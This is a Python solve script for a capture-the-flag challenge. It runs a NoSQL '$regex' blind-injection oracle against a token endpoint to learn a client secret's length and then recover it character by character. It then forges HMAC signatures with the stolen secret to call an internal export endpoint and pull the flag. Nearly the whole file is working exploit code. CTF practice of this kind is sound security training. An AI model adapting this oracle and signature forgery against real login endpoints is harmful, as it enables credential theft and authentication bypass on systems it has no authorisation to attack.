#!/usr/bin/env python3
"""Whisper solve phase 12 — extract report-signer's secret via NoSQL $regex blind oracle.
Oracle: POST /api/token {client_id:'report-signer', client_secret:{'$regex':'^<prefix>'}}
-> 200 if secret starts with prefix, 401 otherwise. Extract full secret, then sign
/internal/export with HMAC-SHA256(secret, string_to_sign) and read the flag.
"""
import time, hmac, hashlib, json, re, requests, urllib3
urllib3.disable_warnings()
B="https://whisper-3cfe1275e06a.chall.hiddeninvestigations.net"; PATH="/internal/export"
s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})

def matches(regex):
    r=s.post(B+"/api/token",
             json={"client_id":"report-signer","client_secret":{"$regex":regex}}, timeout=15)
    return r.status_code==200

def esc(c):  # escape regex metachars for literal match
    return re.escape(c)

# sanity
assert matches("^"), "regex oracle not working"
print("[*] oracle OK (^ matches)")

# determine length via ^.{n}$
def secret_length(maxn=80):
    for n in range(0, maxn+1):
        if matches("^.{"+str(n)+"}$"):
            return n
    return None
L=secret_length()
print(f"[*] secret length = {L}")

charset = ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
           "-_.:!@#$%^&*()+=/{}[]~")
secret=""
print("[*] extracting secret...")
for i in range(L or 0):
    found=False
    for c in charset:
        if matches("^"+esc(secret)+esc(c)):
            secret+=c; found=True
            print(f"    [{i+1}/{L}] {secret}")
            break
    if not found:
        # fallback: brute any byte 0x20-0x7e
        for b in range(0x20,0x7f):
            c=chr(b)
            if matches("^"+esc(secret)+esc(c)):
                secret+=c; found=True; print(f"    [{i+1}/{L}] {secret} (ext)"); break
    if not found:
        print("    [!] no char matched at pos", i); break

print(f"\n[+] RECOVERED SECRET: {secret!r}")
# verify full anchored
print("[*] verify ^secret$ ->", matches("^"+esc(secret)+"$"))

# Now sign /internal/export
FLAG=re.compile(r'[A-Za-z0-9_]{2,20}\{[^}]{3,120}\}')
def do_export(secret, body=b"", query="", sep="\n"):
    ts=str(int(time.time()))
    sts=sep.join(["POST",PATH,query,hashlib.sha256(body).hexdigest(),ts])
    sig=hmac.new(secret.encode(), sts.encode(), hashlib.sha256).hexdigest()
    url=B+PATH+(("?"+query) if query else "")
    r=s.post(url, headers={"X-Client-Id":"report-signer","X-Timestamp":ts,"X-Signature":sig}, data=body, timeout=15)
    return r.status_code, r.text

print("\n[*] calling /internal/export with recovered secret...")
for sep in ["\n"," \n ","\\n"]:
    c,t=do_export(secret, sep=sep)
    print(f"  sep={sep!r} -> [{c}] {t[:400]}")
    for m in FLAG.finditer(t): print("   *** FLAG:", m.group())
    if c==200: break
